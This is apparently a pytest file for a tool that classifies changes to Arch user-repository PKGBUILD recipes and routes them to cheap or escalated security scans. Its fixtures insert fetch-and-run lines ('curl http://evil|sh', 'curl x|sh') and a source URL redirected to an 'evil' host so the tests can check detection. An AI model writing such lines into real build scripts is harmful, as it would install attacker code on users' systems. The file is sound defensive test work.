"""Change classification, scan routing and recipe collection."""
from aurmirror import recipe

PB = "pkgname=x\npkgver=1\npkgrel=1\nsha256sums=('a'*64)\nbuild(){ :; }\n"


def _kind(make_repo, first, second):
    repo = make_repo()
    one = repo.commit(first)
    two = repo.commit(second)
    return recipe.classify_diff(repo.path, one, two)[0]


def test_version_only(make_repo):
    """A pkgver bump alone is a version change."""
    assert _kind(make_repo, {"PKGBUILD": PB},
                 {"PKGBUILD": PB.replace("pkgver=1", "pkgver=2")}) == "version"


def test_checksum_change_is_version(make_repo):
    """Checksums move with the version."""
    new = PB.replace("pkgver=1", "pkgver=2").replace("'a'*64", "'b'*64")
    assert _kind(make_repo, {"PKGBUILD": PB}, {"PKGBUILD": new}) == "version"


def test_build_line_change_is_substantive(make_repo):
    """Code changes escalate."""
    evil = PB.replace("build(){ :; }", "build(){ curl http://evil|sh; }")
    assert _kind(make_repo, {"PKGBUILD": PB}, {"PKGBUILD": evil}) == "substantive"


def test_new_install_file_is_substantive(make_repo):
    """Any file outside PKGBUILD/.SRCINFO escalates."""
    assert _kind(make_repo, {"PKGBUILD": PB},
                 {"PKGBUILD": PB, "x.install": "post_install(){ :; }\n"}) == "substantive"


def test_source_url_change_is_substantive(make_repo):
    """A redirected download escalates."""
    pkgbuild = PB + "source=('https://good.example/x.tar')\n"
    assert _kind(make_repo, {"PKGBUILD": pkgbuild},
                 {"PKGBUILD": pkgbuild.replace("good", "evil")}) == "substantive"


def test_routing():
    """Only version bumps take the cheap lane."""
    assert recipe.route_scan("version") == "haiku"
    assert recipe.route_scan("substantive") == "escalated"
    assert recipe.route_scan("new") == "escalated"


def test_collect_complete(tmp_path):
    """A small recipe is shown in full."""
    (tmp_path / "PKGBUILD").write_text(PB, encoding="utf-8")
    got = recipe.collect_recipe(tmp_path)
    assert not got.partial and "pkgname=x" in got.text


def test_collect_flags_truncation_and_binary(tmp_path):
    """Padding a file or shipping a binary marks the recipe partial."""
    (tmp_path / "PKGBUILD").write_text("#" * (recipe.FILE_CAP + 10) + "\ncurl x|sh\n",
                                       encoding="utf-8")
    (tmp_path / "icon.png").write_bytes(b"\x89PNG\x00\x00binary")
    got = recipe.collect_recipe(tmp_path)
    assert got.partial
    assert "curl x|sh" not in got.text
    assert any("truncated" in o for o in got.omitted)
    assert any("binary" in o for o in got.omitted)


def test_collect_flags_total_cap(tmp_path):
    """Files past the total cap are listed as omitted."""
    for i in range(recipe.TOTAL_CAP // recipe.FILE_CAP + 2):
        (tmp_path / f"part{i:02}.patch").write_text("x" * recipe.FILE_CAP, encoding="utf-8")
    got = recipe.collect_recipe(tmp_path)
    assert got.partial and any("total size cap" in o for o in got.omitted)
